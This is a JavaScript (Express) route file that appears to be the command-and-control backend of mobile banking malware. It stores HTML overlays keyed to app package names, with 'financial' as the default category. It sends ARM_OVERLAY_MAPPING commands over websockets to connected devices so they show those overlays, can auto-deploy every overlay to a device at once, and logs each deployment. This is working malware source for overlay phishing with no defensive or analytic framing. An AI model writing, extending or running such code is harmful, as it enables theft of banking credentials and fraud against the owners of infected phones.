'use strict';
const router = require('express').Router();
const { v4: uuidv4 } = require('uuid');
const { all, get, run } = require('../core/db');
const { devices, broadcast } = require('../core/hub');

// ── List all overlays ─────────────────────────────────────────────────────────
router.get('/', async (_, res) => {
  const rows = await all(`SELECT id,name,package_name,app_name,category,auto_deploy,created_at,
    length(html) as html_size FROM overlays ORDER BY created_at DESC`);
  res.json(rows);
});

// ── Get one overlay (with HTML) ───────────────────────────────────────────────
router.get('/:id', async (req, res) => {
  const r = await get(`SELECT * FROM overlays WHERE id=?`, [req.params.id]);
  if (!r) return res.status(404).json({ error: 'Not found' });
  res.json(r);
});

// ── Create / update overlay ────────────────────────────────────────────────────
router.post('/', async (req, res) => {
  const { name, package_name, app_name, category, html, auto_deploy } = req.body;
  if (!name || !package_name || !html) {
    return res.status(400).json({ error: 'name, package_name and html are required' });
  }
  const id = uuidv4();
  await run(
    `INSERT INTO overlays(id,name,package_name,app_name,category,html,auto_deploy)
     VALUES(?,?,?,?,?,?,?)`,
    [id, name, package_name, app_name || '', category || 'financial', html, auto_deploy ? 1 : 0]
  );
  res.json({ ok: true, id });
});

router.put('/:id', async (req, res) => {
  const { name, package_name, app_name, category, html, auto_deploy } = req.body;
  await run(
    `UPDATE overlays SET name=?,package_name=?,app_name=?,category=?,html=?,auto_deploy=?
     WHERE id=?`,
    [name, package_name, app_name || '', category || 'financial', html, auto_deploy ? 1 : 0, req.params.id]
  );
  res.json({ ok: true });
});

router.delete('/:id', async (req, res) => {
  await run(`DELETE FROM overlays WHERE id=?`, [req.params.id]);
  res.json({ ok: true });
});

// ── Deploy overlay to device ──────────────────────────────────────────────────
router.post('/:id/deploy', async (req, res) => {
  const { dev_id } = req.body;
  if (!dev_id) return res.status(400).json({ error: 'dev_id required' });

  const ov = await get(`SELECT * FROM overlays WHERE id=?`, [req.params.id]);
  if (!ov) return res.status(404).json({ error: 'Overlay not found' });

  const ws = devices.get(dev_id);
  if (!ws || ws.readyState !== 1) {
    return res.status(503).json({ error: 'Device offline' });
  }

  // Send ARM_OVERLAY_MAPPING to device
  ws.send(JSON.stringify({
    type: 'cmd',
    cmd:  'ARM_OVERLAY_MAPPING',
    args: {
      package: ov.package_name,
      html:    ov.html,
      name:    ov.name,
    }
  }));

  // Log deployment
  await run(
    `INSERT INTO overlay_deployments(dev_id,overlay_id,package,status) VALUES(?,?,?,?)`,
    [dev_id, ov.id, ov.package_name, 'armed']
  );

  broadcast({ type: 'overlay_armed', dev_id, overlay_id: ov.id, package: ov.package_name });
  res.json({ ok: true, deployed: true });
});

// ── Disarm overlay on device ──────────────────────────────────────────────────
router.post('/:id/disarm', async (req, res) => {
  const { dev_id } = req.body;
  if (!dev_id) return res.status(400).json({ error: 'dev_id required' });

  const ov = await get(`SELECT * FROM overlays WHERE id=?`, [req.params.id]);
  if (!ov) return res.status(404).json({ error: 'Overlay not found' });

  const ws = devices.get(dev_id);
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({
      type: 'cmd', cmd: 'DISARM_OVERLAY_MAPPING',
      args: { package: ov.package_name }
    }));
  }

  await run(
    `UPDATE overlay_deployments SET status='disarmed'
     WHERE dev_id=? AND overlay_id=?`,
    [dev_id, ov.id]
  );

  broadcast({ type: 'overlay_disarmed', dev_id, overlay_id: ov.id });
  res.json({ ok: true });
});

// ── Deploy ALL auto_deploy overlays to a device ────────────────────────────────
router.post('/auto-deploy/:dev_id', async (req, res) => {
  const { dev_id } = req.params;
  const ws = devices.get(dev_id);
  if (!ws || ws.readyState !== 1) {
    return res.status(503).json({ error: 'Device offline' });
  }

  const overlays = await all(`SELECT * FROM overlays WHERE auto_deploy=1`);
  let deployed = 0;
  for (const ov of overlays) {
    ws.send(JSON.stringify({
      type: 'cmd', cmd: 'ARM_OVERLAY_MAPPING',
      args: { package: ov.package_name, html: ov.html, name: ov.name }
    }));
    await run(
      `INSERT OR REPLACE INTO overlay_deployments(dev_id,overlay_id,package,status)
       VALUES(?,?,?,?)`, [dev_id, ov.id, ov.package_name, 'armed']
    );
    deployed++;
  }

  res.json({ ok: true, deployed });
});

// ── Deployment history ────────────────────────────────────────────────────────
router.get('/deployments/:dev_id', async (req, res) => {
  const rows = await all(
    `SELECT d.*, o.name as overlay_name, o.app_name FROM overlay_deployments d
     LEFT JOIN overlays o ON o.id=d.overlay_id
     WHERE d.dev_id=? ORDER BY d.armed_at DESC`,
    [req.params.dev_id]
  );
  res.json(rows);
});

module.exports = router;
